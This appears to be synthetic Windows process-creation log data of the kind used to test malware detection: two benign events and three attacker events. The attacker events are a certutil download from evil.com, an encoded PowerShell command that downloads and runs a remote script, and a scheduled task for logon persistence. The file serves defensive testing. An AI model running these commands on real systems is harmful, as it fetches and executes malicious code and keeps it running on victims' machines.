[
    {
        "UtcTime": "2026-01-25T03:33:16.556774",
        "ProcessGuid": "edc3adc4-55e8-466e-b365-36acdc82e73b",
        "ProcessId": 1234,
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -hashfile existing_file.txt SHA256",
        "User": "DOMAIN\\User",
        "process_name": "certutil.exe",
        "command_line": "certutil.exe -hashfile existing_file.txt SHA256"
    },
    {
        "UtcTime": "2026-01-25T03:33:16.556806",
        "ProcessGuid": "9855817d-d3f2-47bb-b120-811cba4dcd26",
        "ProcessId": 5678,
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell.exe Get-Date",
        "User": "DOMAIN\\User",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe Get-Date"
    },
    {
        "UtcTime": "2026-01-25T03:33:16.556813",
        "ProcessGuid": "4dbe50af-34cb-457e-8d3b-22c70442e87c",
        "ProcessId": 9999,
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/malware.exe",
        "User": "DOMAIN\\Attacker",
        "process_name": "certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://evil.com/malware.exe"
    },
    {
        "UtcTime": "2026-01-25T03:33:16.556818",
        "ProcessGuid": "bedd1291-f980-40a1-939d-6da0de19c07f",
        "ProcessId": 8888,
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmNvbS9ydW4ucHMxJyk=",
        "User": "DOMAIN\\Attacker",
        "process_name": "powershell.exe",
        "command_line": "powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmNvbS9ydW4ucHMxJyk="
    },
    {
        "UtcTime": "2026-01-25T03:33:16.556821",
        "ProcessGuid": "31836e8d-911c-4179-b11d-9a3860762f36",
        "ProcessId": 7777,
        "Image": "C:\\Windows\\System32\\schtasks.exe",
        "CommandLine": "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\malware.exe\" /sc onlogon",
        "User": "DOMAIN\\Attacker",
        "process_name": "schtasks.exe",
        "command_line": "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\malware.exe\" /sc onlogon"
    }
]
